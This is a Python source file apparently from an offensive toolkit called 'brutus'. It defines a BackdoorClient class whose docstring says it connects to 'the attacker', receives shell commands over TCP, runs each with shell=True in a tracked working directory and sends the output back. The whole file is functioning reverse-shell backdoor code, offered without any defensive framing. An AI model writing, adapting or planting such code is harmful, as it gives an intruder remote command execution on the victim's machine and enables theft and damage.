"""Persistent interactive shell — connects to the attacker and executes commands."""

import pathlib
import subprocess

from brutus.protocol import recv_frame, send_frame
from brutus.victim.client.tcp_client import TCPClient


class BackdoorClient(TCPClient):
    """Connect to the attacker, receive shell commands, send output back."""

    def run(self) -> None:
        try:
            self.connect()
        except Exception:
            return

        cwd = pathlib.Path.cwd()
        try:
            while self.running:
                try:
                    command = recv_frame(self.sock).decode("utf-8").strip()
                except (ConnectionError, EOFError):
                    break

                if not command:
                    continue

                # Handle `cd` without forking a subshell (subshells don't persist cwd)
                if command.startswith("cd"):
                    parts = command.split(None, 1)
                    target = parts[1] if len(parts) > 1 else str(pathlib.Path.home())
                    try:
                        cwd = (cwd / target).resolve()
                        response = f"[cwd] {cwd}"
                    except Exception as exc:
                        response = f"[error] {exc}"
                    send_frame(self.sock, response.encode("utf-8"))
                    continue

                try:
                    result = subprocess.run(
                        command,
                        shell=True,
                        cwd=cwd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                        timeout=30,
                    )
                    output = result.stdout or b""
                except subprocess.TimeoutExpired:
                    output = b"[error] command timed out"
                except Exception as exc:
                    output = f"[error] {exc}".encode()

                send_frame(self.sock, output)
        finally:
            self.close()
